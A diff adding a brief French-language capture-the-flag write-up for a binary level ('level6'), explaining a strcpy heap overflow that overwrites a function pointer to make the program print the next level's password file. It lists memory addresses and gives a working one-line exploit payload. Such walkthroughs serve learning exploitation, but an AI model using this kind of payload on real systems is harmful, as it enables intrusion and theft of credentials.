@@ -1,0 +1,10 @@
+le program utilise strcpy sur le premier argument ce qui nous permet de faire un buffer overflow
+    strcpy(buff, argv[1]);
+
+qui nous permet de change la valeur du pointeur sur fonction de la fonction m a la fonction n qui affiche /home/user/level7/.pass
+
+address of buffer: 0x804a008
+address of function ptr: 0x804A050
+function n ptr: 0x08048454
+function m ptr: 0x08048468
+./level6 "$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')"
